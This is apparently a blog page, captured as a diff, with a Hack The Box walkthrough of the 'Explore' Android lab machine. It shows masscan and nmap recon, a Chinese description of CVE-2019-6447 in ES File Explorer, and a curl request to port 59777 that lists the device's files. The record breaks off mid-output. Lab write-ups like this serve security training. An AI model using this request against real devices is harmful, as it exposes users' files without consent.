@@ -1,0 +1,666 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="World&#39;sEnd">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="HTB Walkthrough - ExploreRecon:1234567Starting masscan 1.3.2 (http:&#x2F;&#x2F;bit.ly&#x2F;14GZzcT) at 2022-05-18 01:14:08 GMTInitiating SYN Stealth ScanScanning 1 hosts [131070 ports&#x2F;host]Discovered open port 35147">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB Walkthrough - Explore">
+<meta property="og:url" content="https://crazyinside.github.io/post/HackTheBox-Explore.html">
+<meta property="og:site_name" content="Network Security Notes">
+<meta property="og:description" content="HTB Walkthrough - ExploreRecon:1234567Starting masscan 1.3.2 (http:&#x2F;&#x2F;bit.ly&#x2F;14GZzcT) at 2022-05-18 01:14:08 GMTInitiating SYN Stealth ScanScanning 1 hosts [131070 ports&#x2F;host]Discovered open port 35147">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220518092546996.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220518093814982.png">
+<meta property="article:published_time" content="2023-08-13T22:39:09.005Z">
+<meta property="article:modified_time" content="2023-08-11T15:52:06.017Z">
+<meta property="article:author" content="World&#39;sEnd">
+<meta property="article:tag" content="Android">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220518092546996.png">
+  
+  
+  
+  <title>HTB Walkthrough - Explore - Network Security Notes</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"crazyinside.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"gtag":null},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://raw.githubusercontent.com/Crazyinside/blog.image/main/material/wallhaven-x6dj5z_3840x2160.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="HTB Walkthrough - Explore"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-14 06:39" pubdate>
+          August 14, 2023 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          16k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          134 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">HTB Walkthrough - Explore</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h4 id="HTB-Walkthrough-Explore"><a href="#HTB-Walkthrough-Explore" class="headerlink" title="HTB Walkthrough - Explore"></a>HTB Walkthrough - Explore</h4><h4 id="Recon"><a href="#Recon" class="headerlink" title="Recon:"></a>Recon:</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-05-18 01:14:08 GMT</span><br><span class="line">Initiating SYN Stealth Scan</span><br><span class="line">Scanning 1 hosts [131070 ports/host]</span><br><span class="line">Discovered open port 35147/tcp on 10.10.10.247                                 </span><br><span class="line">Discovered open port 59777/tcp on 10.10.10.247                                 </span><br><span class="line">Discovered open port 2222/tcp on 10.10.10.247                                  </span><br><span class="line">Discovered open port 42135/tcp on 10.10.10.247  </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sC -sV 10.10.10.247 -p35147,59777,2222,42135 </span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-18 09:17 CST</span><br><span class="line">Stats: 0:01:23 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan</span><br><span class="line">Service scan Timing: About 75.00% <span class="keyword">done</span>; ETC: 09:19 (0:00:27 remaining)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.247</span><br><span class="line">Host is up (0.12s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE    SERVICE VERSION</span><br><span class="line">2222/tcp  open     ssh     (protocol 2.0)</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   NULL: </span><br><span class="line">|_    SSH-2.0-SSH Server - Banana Studio</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)</span><br><span class="line">35147/tcp open     unknown</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   GenericLines: </span><br><span class="line">|     HTTP/1.0 400 Bad Request</span><br><span class="line">|     Date: Wed, 18 May 2022 01:17:44 GMT</span><br><span class="line">|     Content-Length: 22</span><br><span class="line">|     Content-Type: text/plain; charset=US-ASCII</span><br><span class="line">|     Connection: Close</span><br><span class="line">|     Invalid request line:</span><br><span class="line">|   GetRequest: </span><br><span class="line">|     HTTP/1.1 412 Precondition Failed</span><br><span class="line">|     Date: Wed, 18 May 2022 01:17:44 GMT</span><br><span class="line">|     Content-Length: 0</span><br><span class="line">|   HTTPOptions: </span><br><span class="line">|     HTTP/1.0 501 Not Implemented</span><br><span class="line">|     Date: Wed, 18 May 2022 01:17:50 GMT</span><br><span class="line">|     Content-Length: 29</span><br><span class="line">|     Content-Type: text/plain; charset=US-ASCII</span><br><span class="line">|     Connection: Close</span><br><span class="line">|     Method not supported: OPTIONS</span><br><span class="line">|   Help: </span><br><span class="line">|     HTTP/1.0 400 Bad Request</span><br><span class="line">|     Date: Wed, 18 May 2022 01:18:07 GMT</span><br><span class="line">|     Content-Length: 26</span><br><span class="line">|     Content-Type: text/plain; charset=US-ASCII</span><br><span class="line">|     Connection: Close</span><br><span class="line">|     Invalid request line: HELP</span><br><span class="line">|   RTSPRequest: </span><br><span class="line">|     HTTP/1.0 400 Bad Request</span><br><span class="line">|     Date: Wed, 18 May 2022 01:17:50 GMT</span><br><span class="line">|     Content-Length: 39</span><br><span class="line">|     Content-Type: text/plain; charset=US-ASCII</span><br><span class="line">|     Connection: Close</span><br><span class="line">|     valid protocol version: RTSP/1.0</span><br><span class="line">|   SSLSessionReq: </span><br><span class="line">|     HTTP/1.0 400 Bad Request</span><br><span class="line">|     Date: Wed, 18 May 2022 01:18:08 GMT</span><br><span class="line">|     Content-Length: 73</span><br><span class="line">|     Content-Type: text/plain; charset=US-ASCII</span><br><span class="line">|     Connection: Close</span><br><span class="line">|     Invalid request line: </span><br><span class="line">|     ?G???,???`~?</span><br><span class="line">|     ??&#123;????w????&lt;=?o?</span><br><span class="line">|   TLSSessionReq: </span><br><span class="line">|     HTTP/1.0 400 Bad Request</span><br><span class="line">|     Date: Wed, 18 May 2022 01:18:09 GMT</span><br><span class="line">|     Content-Length: 71</span><br><span class="line">|     Content-Type: text/plain; charset=US-ASCII</span><br><span class="line">|     Connection: Close</span><br><span class="line">|     Invalid request line: </span><br><span class="line">|     ??random1random2random3random4</span><br><span class="line">|   TerminalServerCookie: </span><br><span class="line">|     HTTP/1.0 400 Bad Request</span><br><span class="line">|     Date: Wed, 18 May 2022 01:18:08 GMT</span><br><span class="line">|     Content-Length: 54</span><br><span class="line">|     Content-Type: text/plain; charset=US-ASCII</span><br><span class="line">|     Connection: Close</span><br><span class="line">|     Invalid request line: </span><br><span class="line">|_    Cookie: mstshash=nmap</span><br><span class="line">42135/tcp open     http    ES File Explorer Name Response httpd</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (text/html).</span></span><br><span class="line"><span class="string">59777/tcp open     http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older</span></span><br><span class="line"><span class="string">|_http-title: Site doesn&#x27;</span>t have a title (text/plain).</span><br><span class="line">2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">..........................</span><br><span class="line">==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============</span><br><span class="line">Squest\r\nDa</span><br><span class="line">SF:te:\x20Wed,\x2018\x20May\x202022\x2001:18:07\x20GMT\r\nContent-Length:\</span><br><span class="line">SF:x2026\r\nContent-Type:\x20text/plain;\x20charset=US-ASCII\r\nConnection</span><br><span class="line">SF::\x20Close\r\n\r\nInvalid\x20request\x20line:\x20HELP<span class="string">&quot;)%r(SSLSessionReq</span></span><br><span class="line"><span class="string">SF:,DD,&quot;</span>HTTP/1\.0\x20400\x20Bad\x20Request\r\nDate:\x20Wed,\x2018\x20May\x</span><br><span class="line">SF:202022\x2001:18:08\x20GMT\r\nContent-Length:\x2073\r\nContent-Type:\x20</span><br><span class="line">.............................</span><br><span class="line">Service Info: Device: phone</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 116.23 seconds</span><br></pre></td></tr></table></figure>
+
+<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220518092546996.png" srcset="/img/loading.gif" lazyload alt="image-20220518092546996"  />
+
+<p>适用于Android的ES文件浏览器文件管理器应用程序是一款基于Android系统的多功能手机文件，程序和进程管理器，它支持在手机，电脑，远程和蓝牙间浏览管理文件。基于Android平台的ES文件浏览器文件管理器应用程序4.1.9.7.4及之前版本中存在安全漏洞，该漏洞源于ES应用程序在运行一次之后（CVE-2019-6447），该端口并未关闭依旧可以通过HTTP协议接收JSON数据。攻击者可通过向TCP 59777端口发送请求利用该漏洞读取任意文件或执行应用程序。漏洞影响版本：4.1.9.7.4及以下。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; curl 10.10.10.247:59777 -d <span class="string">&#x27;&#123;&quot;command&quot;: &quot;listFiles&quot;&#125;&#x27;</span></span><br><span class="line">[</span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;lib&quot;</span>, <span class="string">&quot;time&quot;</span>:<span class="string">&quot;3/25/20 05:12:02 AM&quot;</span>, <span class="string">&quot;type&quot;</span>:<span class="string">&quot;folder&quot;</span>, <span class="string">&quot;size&quot;</span>:<span class="string">&quot;12.00 KB (12,288 Bytes)&quot;</span>, &#125;, </span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;vndservice_contexts&quot;</span>, <span class="string">&quot;time&quot;</span>:<span class="string">&quot;5/17/22 09:13:03 PM&quot;</span>, <span class="string">&quot;type&quot;</span>:<span class="string">&quot;file&quot;</span>, <span class="string">&quot;size&quot;</span>:<span class="string">&quot;65.00 Bytes (65 Bytes)&quot;</span>, &#125;, </span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;vendor_service_contexts&quot;</span>, <span class="string">&quot;time&quot;</span>:<span class="string">&quot;5/17/22 09:13:03 PM&quot;</span>, <span class="string">&quot;type&quot;</span>:<span class="string">&quot;file&quot;</span>, <span class="string">&quot;size&quot;</span>:<span class="string">&quot;0.00 Bytes (0 Bytes)&quot;</span>, &#125;, </span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;vendor_seapp_contexts&quot;</span>, <span class="string">&quot;time&quot;</span>:<span class="string">&quot;5/17/22 09:13:03 PM&quot;</span>, <span class="string">&quot;type&quot;</span>:<span class="string">&quot;file&quot;</span>, <span class="string">&quot;size&quot;</span>:<span class="string">&quot;0.00 Bytes (0 Bytes)&quot;</span>, &#125;, </span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;vendor_property_contexts&quot;</span>, <span class="string">&quot;time&quot;</span>:<span class="string">&quot;5/17/22 09:13:03 PM&quot;</span>, <span class="string">&quot;type&quot;</span>:<span class="string">&quot;file&quot;</span>, <span class="string">&quot;size&quot;</span>:<span class="string">&quot;392.00 Bytes (392 Bytes)&quot;</span>, &#125;, </span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;vendor_hwservice_contexts&quot;</span>, <span class="string">&quot;time&quot;</span>:<span class="string">&quot;5/17/22 09:13:03 PM&quot;</span>, <span class="string">&quot;type&quot;</span>:<span class="string">&quot;file&quot;</span>, <span class="string">&quot;size&quot;</span>:<span class="string">&quot;0.00 Bytes (0 Bytes)&quot;</span>, &#125;, </span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;vendor_file_contexts&quot;</span>, <span class="string">&quot;time&quot;</span>:<span class="string">&quot;5/17/22 09:13:03 PM&quot;</span>, <span class="string">&quot;type&quot;</span>:<span class="string">&quot;file&quot;</span>, <span class="string">&quot;size&quot;</span>:<span class="string">&quot;6.92 KB (7,081 Bytes)&quot;</span>, &#125;, </span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;vendor&quot;</span>, <span class="string">&quot;time&quot;</span>:<span class="string">&quot;3/25/20 12:12:33 AM&quot;</span>, <span class="string">&quot;type&quot;</span>:<span class="string">&quot;folder&quot;</span>, <span class="string">&quot;size&quot;</span>:<span class="string">&quot;4.00 KB (4,096 Bytes)&quot;</span>, &#125;, </span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;ueventd.rc&quot;</span>, <span class="string">&quot;time&quot;</span>:<span class="string">&quot;5/17/22 09:13:03 PM&quot;</span>, <span class="string">&quot;type&quot;</span>:<span class="string">&quot;file&quot;</span>, <span class="string">&quot;size&quot;</span>:<span class="string">&quot;5.00 KB (5,122 Bytes)&quot;</span>, &#125;, </span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;ueventd.android_x86_64.rc&quot;</span>, <span class="string">&quot;time&quot;</span>:<span class="string">&quot;5/17/22 09:13:03 PM&quot;</span>, <span class="string">&quot;type&quot;</span>:<span class="string">&quot;file&quot;</span>, <span class="string">&quot;size&quot;</span>:<span class="string">&quot;464.00 Bytes (464 Bytes)&quot;</span>, &#125;, </span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;system&quot;</span>, <span class="string">&quot;time&quot;</span>:<span class="string">&quot;3/25/20 12:12:31 AM&quot;</span>, <span class="string">&quot;type&quot;</span>:<span class="string">&quot;folder&quot;</span>, <span class="string">&quot;size&quot;</span>:<span class="string">&quot;4.00 KB (4,096 Bytes)&quot;</span>, &#125;, </span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;sys&quot;</span>, <span class="string">&quot;time&quot;</span>:<span class="string">&quot;5/17/22 09:13:03 PM&quot;</span>, <span class="string">&quot;type&quot;</span>:<span class="string">&quot;folder&quot;</span>, <span class="string">&quot;size&quot;</span>:<span class="string">&quot;0.00 Bytes (0 Bytes)&quot;</span>, &#125;, </span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;storage&quot;</span>, <span class="string">&quot;time&quot;</span>:<span class="string">&quot;5/17/22 09:13:07 PM&quot;</span>, <span class="string">&quot;type&quot;</span>:<span class="string">&quot;folder&quot;</span>, <span class="string">&quot;size&quot;</span>:<span class="string">&quot;80.00 Bytes (80 Bytes)&quot;</span>, &#125;, </span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;sepolicy&quot;</span>, <span class="string">&quot;time&quot;</span>:<span class="string">&quot;5/17/22 09:13:03 PM&quot;</span>, <span class="string">&quot;type&quot;</span>:<span class="string">&quot;file&quot;</span>, <span class="string">&quot;size&quot;</span>:<span class="string">&quot;357.18 KB (365,756 Bytes)&quot;</span>, &#125;, </span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;sdcard&quot;</span>, <span class="string">&quot;time&quot;</span>:<span class="string">&quot;4/21/21 02:12:29 AM&quot;</span>, <span class="string">&quot;type&quot;</span>:<span class="string">&quot;folder&quot;</span>, <span class="string">&quot;size&quot;</span>:<span class="string">&quot;4.00 KB (4,096 Bytes)&quot;</span>, &#125;, </span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;sbin&quot;</span>, <span class="string">&quot;time&quot;</span>:<span class="string">&quot;5/17/22 09:13:03 PM&quot;</span>, <span class="string">&quot;type&quot;</span>:<span class="string">&quot;folder&quot;</span>, <span class="string">&quot;size&quot;</span>:<span class="string">&quot;140.00 Bytes (140 Bytes)&quot;</span>, &#125;, </span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;product&quot;</span>, <span class="string">&quot;time&quot;</span>:<span class="string">&quot;3/24/20 11:39:17 PM&quot;</span>, <span class="string">&quot;type&quot;</span>:<span class="string">&quot;folder&quot;</span>, <span class="string">&quot;size&quot;</span>:<span class="string">&quot;4.00 KB (4,096 Bytes)&quot;</span>, &#125;, </span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;proc&quot;</span>, <span class="string">&quot;time&quot;</span>:<span class="string">&quot;5/17/22 09:13:02 PM&quot;</span>, <span class="string">&quot;type&quot;</span>:<span class="string">&quot;folder&quot;</span>, <span class="string">&quot;size&quot;</span>:<span class="string">&quot;0.00 Bytes (0 Bytes)&quot;</span>, &#125;, </span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;plat_service_contexts&quot;</span>, <span class="string">&quot;time&quot;</span>:<span class="string">&quot;5/17/22 09:13:03 PM&quot;</span>, <span class="string">&quot;type&quot;</span>:<span class="string">&quot;file&quot;</span>, <span class="string">&quot;size&quot;</span>:<span class="string">&quot;13.73 KB (14,057 Bytes)&quot;</span>, &#125;, </span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;plat_seapp_contexts&quot;</span>, <span class="string">&quot;time&quot;</span>:<span class="string">&quot;5/17/22 09:13:03 PM&quot;</span>, <span class="string">&quot;type&quot;</span>:<span class="string">&quot;file&quot;</span>, <span class="string">&quot;size&quot;</span>:<span class="string">&quot;1.28 KB (1,315 Bytes)&quot;</span>, &#125;, </span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;plat_property_contexts&quot;</span>, <span class="string">&quot;time&quot;</span>:<span class="string">&quot;5/17/22 09:13:03 PM&quot;</span>, <span class="string">&quot;type&quot;</span>:<span class="string">&quot;file&quot;</span>, <span class="string">&quot;size&quot;</span>:<span class="string">&quot;6.53 KB (6,687 Bytes)&quot;</span>, &#125;, </span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;plat_hwservice_contexts&quot;</span>, <span class="string">&quot;time&quot;</span>:<span class="string">&quot;5/17/22 09:13:03 PM&quot;</span>, <span class="string">&quot;type&quot;</span>:<span class="string">&quot;file&quot;</span>, <span class="string">&quot;size&quot;</span>:<span class="string">&quot;7.04 KB (7,212 Bytes)&quot;</span>, &#125;, </span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;plat_file_contexts&quot;</span>, <span class="string">&quot;time&quot;</span>:<span class="string">&quot;5/17/22 09:13:03 PM&quot;</span>, <span class="string">&quot;type&quot;</span>:<span class="string">&quot;file&quot;</span>, <span class="string">&quot;size&quot;</span>:<span class="string">&quot;23.30 KB (23,863 Bytes)&quot;</span>, &#125;, </span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;oem&quot;</span>, <span class="string">&quot;time&quot;</span>:<span class="string">&quot;5/17/22 09:13:03 PM&quot;</span>, <span class="string">&quot;type&quot;</span>:<span class="string">&quot;folder&quot;</span>, <span class="string">&quot;size&quot;</span>:<span class="string">&quot;40.00 Bytes (40 Bytes)&quot;</span>, &#125;, </span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;odm&quot;</span>, <span class="string">&quot;time&quot;</span>:<span class="string">&quot;5/17/22 09:13:03 PM&quot;</span>, <span class="string">&quot;type&quot;</span>:<span class="string">&quot;folder&quot;</span>, <span class="string">&quot;size&quot;</span>:<span class="string">&quot;220.00 Bytes (220 Bytes)&quot;</span>, &#125;, </span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;mnt&quot;</span>, <span class="string">&quot;time&quot;</span>:<span class="string">&quot;5/17/22 09:13:04 PM&quot;</span>, <span class="string">&quot;type&quot;</span>:<span class="string">&quot;folder&quot;</span>, <span class="string">&quot;size&quot;</span>:<span class="string">&quot;240.00 Bytes (240 Bytes)&quot;</span>, &#125;, </span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;init.zygote64_32.rc&quot;</span>, <span class="string">&quot;time&quot;</span>:<span class="string">&quot;5/17/22 09:13:03 PM&quot;</span>, <span class="string">&quot;type&quot;</span>:<span class="string">&quot;file&quot;</span>, <span class="string">&quot;size&quot;</span>:<span class="string">&quot;875.00 Bytes (875 Bytes)&quot;</span>, &#125;, </span><br><span class="line">&#123;<span class="string">&quot;name&quot;</span>:<span 